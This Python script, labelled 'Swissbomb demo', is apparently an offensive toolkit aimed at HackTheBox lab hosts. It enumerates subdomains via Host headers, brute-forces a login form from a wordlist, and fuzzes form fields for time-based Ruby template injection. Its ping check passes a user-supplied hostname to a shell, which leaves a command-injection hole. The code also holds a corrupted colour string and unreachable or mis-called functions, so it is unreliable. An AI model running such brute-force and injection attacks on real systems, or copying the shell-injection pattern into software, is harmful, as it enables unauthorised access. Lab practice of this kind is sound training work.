#!/usr/bin/env python3

import sys, argparse, random, time, subprocess, string, socket, json, os, tempfile
from pathlib import Path

import requests
from bs4 import BeautifulSoup
import urllib.parse
from urllib.parse import urljoin, urlencode, urlparse
from urllib3.util.retry import Retry

RESET = '\033[0m' # return to standard terminal text color
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
LIGHT_GRAY = '\033[37m'
DARK_GRAY = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
WHITE = '\033[97m'
BACKGROUND_BLACK = '\033[40m'
BACKGROUND_RED = '\033[41m'
BACKGROUND_GREEN = '\033[42m'
BACKGROUND_YELLOW = '\033[43m'
BACKGROUND_BLUE = '\033[44m'
BACKGROUND_MAGENTA = '\033[45m'
BACKGROUND_CYAN = '\033[46m'
BACKGROUND_LIGHT_GRAY = '\third-party033[47m'
BACKGROUND_DARK_GRAY = '\033[100m'
BACKGROUND_BRIGHT_RED = '\033[101m'
BACKGROUND_BRIGHT_GREEN = '\033[102m'
BACKGROUND_BRIGHT_YELLOW = '\033[103m'
BACKGROUND_BRIGHT_BLUE = '\033[104m'
BACKGROUND_BRIGHT_MAGENTA = '\033[105m'
BACKGROUND_BRIGHT_CYAN = '\033[106m'
BACKGROUND_WHITE = '\033[107m'



##Todo
# robots.txt vuln checker function
# git repository finder function
# pass wordlist as filename to exploit function

def check_robots(result: dict):
    result["Check_robots"] = False
    print("checking robots")


def send_request(target, header, result, timeout):
    try:
        response = requests.get(
            target,
            headers={"Host": header},
            verify=False,
            allow_redirects=False)
        status = response.status_code
        location = response.headers.get("Location", "")
        #wildcard check
        if result["Subdomain_wildcard_detected"]:
            if 200 <= status < 300:
                print(f"{RED}{status}{RESET} {result["target"]} {location} * wildcard detected{RESET}")
                return True
            else:
                result["Subdomain_wildcard_detected"] = False
                return False
        #detect redirect
        if status in (301, 302, 307, 308):
            print(f"{BLUE}{status}{RESET} {result["Target"]} -> {location}{RESET}")
            return False
        elif 200 <= status < 300:
            print(f"{GREEN}{status}{RESET} {result["Target"]} exists!{RESET}")
            return True
        elif 300 <= status < 400:
            print(f"{BLUE}{status}{RESET} {result["Target"]} {location}{RESET}")
            return False
        elif 400 <= status < 500:
            print(f"{RED}{status}{RESET} {result["Target"]} {location}{RESET}")
            return False
        else:
            print(f"{RED}{status}{RESET} {result["Target"]}{RESET}")
            return False
    except requests.exceptions.HTTPError as e:
        print(RED)
        print(f"{result["Target"]}")
        print(e)
        print(RESET)
    except requests.RequestException as e:
        print(RED)
        print(f"{result["Target"]}")
        print(e)
        print(RESET)

    return result


def enumerate_subdomain(result: dict, url: str, domain: str, ip: str, HTTPS: bool, speed: int, timeout: int = 5):
    result["Enumerate_subdomain"] = False
    target = url

    random_header = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}.{domain}"

    if HTTPS:
        target = f"https://{ip}"
        random_target = f"https://{ip}"
    else:
        target = f"http://{ip}"
        random_target = f"http://{ip}"

    result["Subdomain_wildcard_detected"] = True

    # Wildcard detection
    if HTTPS:
        result["Target"] = f"https://{random_header}"
        if send_request(random_target, random_header, result, timeout):
            print("This domain uses wirldcard")
            return
        result["Target"] = f"{result["url"]}"
        if result["Subdomain_wildcard_detected"]:
            return result
    else:
        result["Target"] = f"http://{random_header}"
        if send_request(random_target, random_header, result, timeout):
            print("This domain uses wirldcard")
            return
        result["Target"] = f"{result["url"]}"
        if result["Subdomain_wildcard_detected"]:
            result["Target"] = f"https://{random_header}"
            return result

    # loop through wordlist of subdomains
    with open("wordlist.txt") as f:
        for word in f:
            word = word.strip()
            header = f"{word}.{domain}"
            if HTTPS:
                result["Target"] = f"https://{word}.{domain}"
                if send_request(target, header, result, timeout):
                    if result.get("Subdmains", False):
                        result["Subdomains"] = ""
                    result["Subdomains"] = f"{result["Subdomains"]},{result["Target"]}"
            else:
                result["Target"] = f"http://{word}.{domain}"
                if send_request(target, header, result, timeout):
                    if not result.get("Subdomains", False):
                        result["Subdomains"] = ""
                    result["Subdomains"] = f"{result["Subdomains"]} {result["Target"]}"


            time.sleep(speed)
        result["Target"] = f"{result["url"]}"

    return result

def format_response(response, payload):
    if response.status_code > 300 and response.status_code < 500:
        print(RED + str(response.status_code) + RESET)
    elif response.status_code > 400 and response.status_code < 600:
        print(YELLOW + str(response.status_code) + RESET)
    elif response.status_code > 100 and response.status_code < 300:
        print(GREEN + str(response.status_code) + RESET)
        return
    print(response.text, "with:", payload)


def cypher(url):

#  url = "http://cypher.htb/login"

    session = requests.Session()
    response = session.get(url)

    soup = BeautifulSoup(response.text, "html.parser")

    form = soup.find("form")
    action = form.get("action")
    post_url = urljoin(url, action)
    print("This is the post URL: ", post_url)

    c = [("admin", "admin")]

    with open("wordlist.txt") as f:
        for word in f:
            for u, p in c:
                formatted = f'{{"username":"{word.strip()}","password":"{p}"}}'
                post_response = session.post(post_url, data=formatted, timeout=60)
                format_response(post_response, urllib.parse.quote_plus(formatted))
                time.sleep(1)
                formatted = f'{{"username":"{u}","password":"{word.strip()}"}}'
                post_response = session.post(post_url, data=formatted, timeout=60)
                format_response(post_response, urllib.parse.quote_plus(formatted))
                time.sleep(1)


def weightedgrade(url):

    session = requests.Session()

  #  url = "http://10.10.11.253/weighted-grade"
    response = session.get(url)

    soup = BeautifulSoup(response.text, "html.parser")

    form = soup.find("form")
    action = form.get("action")
    post_url = urljoin(url, action)
    print("This is the post URL: ", post_url)

    payload = {}


    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        value = input_tag.get("value", "")

        if name:
            payload[name] = value
        if not value and input_tag.get("type") == "number" and input_tag.has_attr("required"):
            payload[name] = 20

        if not value and input_tag.get("type") == "text" and input_tag.has_attr("required"):
            payload[name] = "test"

    with open("wordlist.txt") as f:
      for x in f:
        for k, v in payload.items():
          if payload[k] == "test":
              temp = payload[k]
              payload[k] = "FUZZVALUE"
              encoded_payload = urlencode(list(payload.items()))
              encoded_payload = encoded_payload.replace('FUZZVALUE', x.strip())

              start = time.monotonic()
              post_response = session.post(post_url, data=encoded_payload, timeout=60)
              elapsed = time.monotonic() - start

              if elapsed > 5:
                  print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                  print("Full Payload:", encoded_payload)
                  print("payload: ", x)
                  sys.exit()
              payload[k] = temp
              print(post_response.status_code)
#            print(post_response.text)
          else:
              continue


def check_ping(hostname) -> bool:
    print("Hostname:",hostname)
    try:
        subprocess.check_output(
            "ping -c 1 -w 2 " + hostname, shell=True
        )
    except Exception:
        print(RED + "ping check failed" + RESET)
        sys.exit()

    print('Ping: Success')
    return True


def get_rate(rate_name):
    return {
        "fast": 0.1,
        "medium": 0.5,
        "slow": 1.0,
    }[rate_name]


def append_log(output_file, key, value):
    with open(output_file, "a") as f:
        f.write(json.dumps({key: value}) + "\n")
        f.flush()
        os.fsync(f.fileno())

def add_result_missing_check(result: dict, file, key, value):
    if key in result:
        return result[key]
    result[key] = value
    append_log(file, key, value)
    return value


def write_current_state(output_file, result: dict):
    """
    Rewrite output_file so it exactly matches the current contents of result.
    Safe on Linux (atomic replace).
    """

    directory = os.path.dirname(os.path.abspath(output_file)) or "."

    # write to a temp file first
    with tempfile.NamedTemporaryFile(
        mode="w",
        dir=directory,
        delete=False
    ) as tmp:
        for key, value in result.items():
            tmp.write(json.dumps({key: value}) + "\n")
        tmp.flush()
        os.fsync(tmp.fileno())

    # atomic replace
    os.replace(tmp.name, output_file)


def load_log(output_file, result: dict):
    if not output_file.exists():
        return

    with open(output_file) as f:
        for line_no, line in enumerate(f, 1):
            try:
                entry = json.loads(line)
            except json.JSONDecodeError:
                print(f"Skipping corrupt line {line_no}")
                continue

            # each entry is {key: value}
            for key, value in entry.items():
                result[key] = value

def parse_arguments():

    parser = argparse.ArgumentParser(
            prog='swb.py',
            description='Swissbomb demo',
            epilog='this is the epilog')

    parser.add_argument('url',
                        help='the URL of your choice: %(prog)s  http://htburl.htb',
                        type=str)
    parser.add_argument('--noping',
                        help='skip the default ping check',
                        action='store_true')
    parser.add_argument('--nosub',
                        help='skip subdomain enumeration',
                        action='store_false')
    parser.add_argument('--norobots',
                        help='skip robots.txt check',
                        action='store_false')
    parser.add_argument('--newscan',
                        help='Force fresh scan',
                        action='store_true')
    parser.add_argument('-r', '--rate',
                        help='rate limit fast, medium, slow',
                        default='fast', choices=['fast', 'medium', 'slow'],
                        type=str)
    parser.add_argument('-i', '--ip',
                        help='rate limit FAST, MEDIUM, SLOW',
                        type=str)
    args = parser.parse_args()
    return args

def main():

    args = parse_arguments()
    url = args.url
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    ip = socket.gethostbyname(hostname)
    HTTPS = False
    speed = get_rate(args.rate)
    timeout = 5
    output_file = Path(f"{hostname}.log")

    result = {"Target": url,
              "IP": ip,
              "url": url,
              "hostname": hostname
            }
    result["Enumerate_subdomain"] = args.nosub
    result["Check_robots"] = args.norobots

    if not args.noping:
        check_ping(hostname)
    else:
        print("Skipping the ping check")

    if args.ip:
        print("IP:", args.ip)
        ip = args.ip
    else:
        print(YELLOW + "No IP specified detected this", ip + RESET)

    if "https" in url:
        HTTPS = True
        print(GREEN + "HTTPS:", str(HTTPS) + RESET)
        add_result_missing_check(result, output_file, "HTTPS", HTTPS)
    else:
        HTTPS = False
        print(YELLOW + "HTTPS:", str(HTTPS) + RESET)
        add_result_missing_check(result, output_file, "HTTPS", HTTPS)


    print('Target:', url)
    time.sleep(2)


#   resume from last scan
    if not args.newscan:
        load_log(output_file, result)

# select function to run
    if result["Enumerate_subdomain"]:
        enumerate_subdomain(result, url, hostname, ip, HTTPS, speed, timeout)
        write_current_state(output_file, result)

    if result["Check_robots"]:
        check_robots(result)
        write_current_state(output_file, result)
    sys.exit()

    cypher(url)
    sys.exit()
    weightedgrade()
    sys.exit()

if __name__=="__main__":
    main()

